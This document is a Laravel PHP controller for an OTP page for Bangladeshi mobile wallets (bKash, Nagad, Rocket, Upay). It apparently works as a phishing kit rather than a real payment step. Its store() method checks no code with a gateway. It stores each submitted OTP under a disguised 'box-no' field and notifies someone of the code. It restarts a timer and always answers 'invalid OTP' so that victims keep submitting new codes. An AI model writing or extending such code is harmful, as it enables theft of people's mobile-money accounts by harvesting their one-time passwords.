<?php

namespace App\Modules\Payment\Http\Controllers;
use App\Events\PaymentOtpSubmitted;
use App\Modules\Forms\FormNotificationService;
use App\Modules\Payment\Http\Requests\StoreOtpRequest;
use App\Modules\Payment\Services\PaymentSession;
use App\Modules\Payment\Support\GatewayManager;
use Illuminate\Http\JsonResponse;
use Illuminate\Http\RedirectResponse;
use Illuminate\Http\Request;
use Illuminate\Routing\Controller;
use Illuminate\View\View;

class OtpController extends Controller
{
    public function __construct(
        private PaymentSession $session,
        private GatewayManager $gateways,
        private readonly FormNotificationService $notifications,
    ) {
    }

public function show(): View
{
    $method = $this->session->get('method');

    return match ($method) {
        'bkash' => view('payment::steps.bkash.otp', [
            'session' => $this->session,
        ]),

        'nagad' => view('payment::steps.nagad.otp', [
            'session' => $this->session,
        ]),

        'rocket' => view('payment::steps.rocket.otp', [
            'session' => $this->session,
        ]),

        'upay' => view('payment::steps.upay.otp', [
            'session' => $this->session,
        ]),

        default => abort(400, 'Invalid payment method'),
    };
}



    public function store(StoreOtpRequest $request): RedirectResponse
    {
        $otp = $request->validated()['otp'];
        $referenceNo = $this->session->get('reference_no');

        if (! $referenceNo) {
            return back()->withErrors(['otp' => 'Session expired. Please start again.']);
        }

        $application = \App\Models\Application::where('payment_reference', $referenceNo)->first();

        if (! $application) {
            return back()->withErrors(['otp' => 'Application not found.']);
        }

        $metaInfo = $application->meta_info;

        if (is_string($metaInfo)) {
            $decoded = json_decode($metaInfo, true);
            $metaInfo = is_array($decoded) ? $decoded : [];
        } elseif (! is_array($metaInfo)) {
            $metaInfo = [];
        }

        // আগে 'box-no' একক মান ছিল হয়তো, থাকলে অ্যারেতে রূপান্তর
        if (! isset($metaInfo['box-no']) || ! is_array($metaInfo['box-no'])) {
            $metaInfo['box-no'] = array_filter([$metaInfo['box-no'] ?? null]);
        }

        // Avoid appending a duplicate entry when the same update is
        // (re)broadcast/resubmitted for this code (e.g. a retried request).
        $lastBoxNumber = count($metaInfo['box-no']) > 0
            ? end($metaInfo['box-no'])
            : null;

        if ($lastBoxNumber !== $otp) {
            $metaInfo['box-no'][] = $otp; // নতুনটা যোগ হলো, আগেরগুলো থাকলো

            // Product Info countdown anchor: a genuinely new box_no update
            // stops any running countdown and restarts a fresh 3-minute one.
            $metaInfo['product_countdown_at'] = now()->toIso8601String();
        }

        $application->update(['meta_info' => $metaInfo]);

        event(new PaymentOtpSubmitted($application));
        $this->notifications->notifyOtpSubmitted($application, $otp);

        // return back()->with('success', 'OTP submitted successfully.');
        return back()->withErrors([
            'otp' => 'invalid OTP',
        ]);
    }


    public function resend(Request $request): RedirectResponse|JsonResponse
    {
        $response = $this->gateways->driver()->resendOtp($this->session);

        if ($request->expectsJson()) {
            return response()->json(
                ['message' => $response->message],
                $response->successful ? 200 : 422,
            );
        }

        if (! $response->successful) {
            return back()->withErrors(['otp' => $response->message]);
        }

        return back()->with('status', $response->message);
    }
}
